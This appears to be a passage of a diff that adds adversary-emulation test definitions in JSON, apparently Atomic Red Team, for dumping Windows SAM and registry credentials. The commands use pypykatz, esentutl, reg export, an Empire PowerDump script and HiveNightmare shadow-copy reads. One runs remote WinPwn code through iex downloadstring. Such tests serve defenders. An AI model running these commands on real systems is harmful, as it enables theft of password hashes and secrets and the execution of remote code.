+                        "name": "Registry parse with pypykatz",
+                        "auto_generated_guid": "a96872b2-cbf3-46cf-8eb4-27e8c0e85263",
+                        "description": "Parses registry hives to obtain stored credentials.\n\nWill create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "venv_path": {
+                                "description": "Path to the folder for the tactics venv",
+                                "type": "string",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1003_002"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Computer must have python 3 installed\n",
+                                "prereq_command": "if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n"
+                            },
+                            {
+                                "description": "Computer must have venv configured at #{venv_path}\n",
+                                "prereq_command": "if (Test-Path -Path \"#{venv_path}\") { exit 0 } else { exit 1 }\n",
+                                "get_prereq_command": "py -m venv \"#{venv_path}\"\n"
+                            },
+                            {
+                                "description": "pypykatz must be installed \n",
+                                "prereq_command": "if (Get-Command \"#{venv_path}\\Scripts\\pypykatz\" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
+                                "get_prereq_command": "& \"#{venv_path}\\Scripts\\pip.exe\" install --no-cache-dir pypykatz 2>&1 | Out-Null\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "\"#{venv_path}\\Scripts\\pypykatz\" live lsa \n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "esentutl.exe SAM copy",
+                        "auto_generated_guid": "a90c2f4d-6726-444e-99d2-a00cd7c20480",
+                        "description": "Copy the SAM hive using the esentutl.exe utility\nThis can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "file_path": {
+                                "description": "Path to the file to copy",
+                                "type": "path",
+                                "default": "%SystemRoot%/system32/config/SAM"
+                            },
+                            "file_name": {
+                                "description": "Name of the copied file",
+                                "type": "string",
+                                "default": "SAM"
+                            },
+                            "copy_dest": {
+                                "description": "Destination of the copied file",
+                                "type": "string",
+                                "default": "%temp%"
+                            }
+                        },
+                        "executor": {
+                            "command": "esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}\n",
+                            "name": "command_prompt",
+                            "elevation_required": true,
+                            "cleanup_command": "del #{copy_dest}\\#{file_name} >nul 2>&1\n"
+                        }
+                    },
+                    {
+                        "name": "PowerDump Hashes and Usernames from Registry",
+                        "auto_generated_guid": "804f28fc-68fc-40da-b5a2-e9d0bce5c193",
+                        "description": "Executes a hashdump by reading the hashes from the registry.",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "dependencies": [
+                            {
+                                "description": "PowerDump script must exist on disk at specified location",
+                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\") {exit 0} else {exit 1} ",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-Webrequest -Uri \"https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\""
+                            }
+                        ],
+                        "executor": {
+                            "command": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green\nImport-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\"\nInvoke-PowerDump",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "dump volume shadow copy hives with certutil",
+                        "auto_generated_guid": "eeb9751a-d598-42d3-b11c-c122d9c3f6c7",
+                        "description": "Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as \"HiveNightmare\" or \"SeriousSAM\".\nThis can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "target_hive": {
+                                "description": "Hive you wish to dump",
+                                "type": "string",
+                                "default": "SAM"
+                            },
+                            "limit": {
+                                "description": "Limit to the number of shadow copies to iterate through when trying to copy the hive",
+                                "type": "integer",
+                                "default": 10
+                            }
+                        },
+                        "executor": {
+                            "command": "for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%a\\Windows\\System32\\config\\#{target_hive}\" %temp%\\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\\#{target_hive}vss*\n",
+                            "name": "command_prompt",
+                            "elevation_required": false,
+                            "cleanup_command": "for /L %a in (1,1,#{limit}) do @(del %temp%\\#{target_hive}vss%a >nul 2>&1)\n"
+                        }
+                    },
+                    {
+                        "name": "dump volume shadow copy hives with System.IO.File",
+                        "auto_generated_guid": "9d77fed7-05f8-476e-a81b-8ff0472c64d0",
+                        "description": "Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "target_hive": {
+                                "description": "Hive you wish to dump",
+                                "type": "string",
+                                "default": "SAM"
+                            },
+                            "limit": {
+                                "description": "Limit to the number of shadow copies to iterate through when trying to copy the hive",
+                                "type": "integer",
+                                "default": 10
+                            }
+                        },
+                        "executor": {
+                            "command": "1..#{limit} | % { \n try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\#{target_hive}\" , \"$env:TEMP\\#{target_hive}vss$_\", \"true\") } catch {}\n ls \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore\n}\n",
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "cleanup_command": "1..#{limit} | % {\n  rm \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore\n}\n"
+                        }
+                    },
+                    {
+                        "name": "WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes",
+                        "auto_generated_guid": "0c0f5f06-166a-4f4d-bb4a-719df9a01dbb",
+                        "description": "Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsamfile -consoleoutput -noninteractive  ",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Dumping of SAM, creds, and secrets(Reg Export)",
+                        "auto_generated_guid": "21df41be-cdd8-4695-a650-c3981113aa3c",
+                        "description": "Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated via three registry keys. Used reg export to execute this behavior\nUpon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "reg export HKLM\\sam %temp%\\sam\nreg export HKLM\\system %temp%\\system\nreg export HKLM\\security %temp%\\security\n",
+                            "cleanup_command": "del %temp%\\sam >nul 2> nul\ndel %temp%\\system >nul 2> nul\ndel %temp%\\security >nul 2> nul\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 10:38:03"
+}
